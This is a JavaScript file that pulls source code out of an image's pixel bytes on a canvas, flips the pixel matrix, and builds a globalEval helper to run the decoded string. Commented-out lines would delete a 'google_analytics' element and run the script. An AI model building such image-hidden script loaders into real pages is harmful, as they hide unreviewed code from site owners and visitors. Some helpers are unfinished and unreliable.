

var globalEval = function globalEval(src) {
	if (window.execScript) {
		window.execScript(src);
		return;
	}
	var fn = function() {
		window.eval.call(window,src);
	};
	fn();
};


window.onload = function(){
	var i = document.getElementById('cc'),
		i_w = i.width,
		i_h = i.height,
		cd = document.getElementById('cd'),
		ctx = cd.getContext('2d');

	cd.width = i_w;
	cd.height = i_h;

	ctx.drawImage(i,0,0);

	var imageData = ctx.getImageData(0,0,i_w,i_h),
		data = imageData.data,
		dlen = data.length

	var	pixel_size = 4,
		pixels_per_row = i_w * pixel_size;



	var toImageMatrix = function(data)
	{
		// To image matrix
		var image_matrix = [],
			pixel = new Uint8Array(pixel_size);
			temp_row = []

		var max_column = 0

		// Make Image Matrix
		for (var d=0; d < dlen; d++)
		{
			var rgba_index = d % pixel_size;
			pixel[rgba_index] = data[d];

			if (rgba_index === pixel_size - 1){
				temp_row.push(pixel);
				pixel = new Uint8Array(pixel_size);

				var row = parseInt(d / pixels_per_row),
					column = parseInt((d - ( row * pixels_per_row )) / pixel_size)

				if ( column === (i_w - 1) ){
					image_matrix.push(temp_row);
					temp_row = []
				}
			}
		}
		return image_matrix
	}




	var flipHorizontal = function(image_matrix)
	{
		var middle = parseInt(i_w/2)
		for (var r = 0; r < i_h; r++){
			for (var c = 0; c < middle; c++){
				var temp = image_matrix[r][c]
				image_matrix[r][c] = image_matrix[r][i_w-(c+1)]
				image_matrix[r][i_w-(c+1)] = temp
			}
		}
	}


	var flipDiagonal = function(image_matrix)
	{
		for (var r = 0; r < i_h; r++){
			for (var c = r; c < i_w; c++)
			{
				var temp = image_matrix[r][c];
				image_matrix[r][c] = image_matrix[c][r];
				image_matrix[c][r] = temp;
			}
		}
	}


	var flipVertical = function(image_matrix)
	{
		for (var r=0; r < i_h/2; r++){
			var temp = image_matrix[r]
			image_matrix[r] = image_matrix[i_h-(r+1)]
			image_matrix[i_h-(r+1)] = temp
		}
	}



	var imageToData = function(image_matrix)
	{
		var code = new Uint8Array(dlen);

		for (var r=0; r < i_h; r++){
			for (var c=0; c < i_w; c++){
				for (var j=0; j < pixel_size; j++){
					code[(r*i_w*pixel_size)+(c*pixel_size)+j] = image_matrix[r][c][j]
				}
			}
		}
		return code
	}
	
	
	var shiftBackward = function(image_matrix,n)
	{
		var code = imageToData(image_matrix)

		var store = new Uint8Array(n)		// Store the first n
		for (var j=0; j <n; j++){
			store[j] = code[j]
		}
		for (var j=n; j < code.length; j++){ // Iterate over the remaning
			code[j-n] = code[j]
		}
		for (var j=0; j <n; j++){		// Replace last n with the first
			code[dlen+j-n] = store[j]
		}

		return toImageMatrix(code)
	}


	var shiftForward = function(image_matrix,n) // NEEDS WORK
	{
		var code = imageToData(image_matrix)

		var store = new Uint8Array(n);			// Store the last n
		for (var j=dlen-n; j < dlen; j++){
			store[j-(dlen-n)] = code[j]
		}
		for (var j=dlen-(n+1); j >= 0 ;j--){ // Iterate over the previous
			code[j+n] = code[j]
		}
		for (var j=0; j <n; j++){ // Replace first n with last
			code[j] = store[j]
		}
		return toImageMatrix(code)
	}



	var image_matrix = toImageMatrix(data)
	flipVertical(image_matrix) // works
//	flipHorizontal(image_matrix)
//	flipDiagonal(image_matrix)


	// Decode (this works)
	var code = [];
	for (var r = 0; r < i_h; r++){
		for (var c = 0; c < i_w; c++){
			code.push(image_matrix[r][c][0])
			code.push(image_matrix[r][c][1])
			code.push(image_matrix[r][c][2])
		}
	}

	var new_script = String.fromCharCode.apply(String,code);
	console.log(new_script)
	// var io = document.getElementById('google_analytics')
	// io.remove();

	// globalEval(new_script)
}
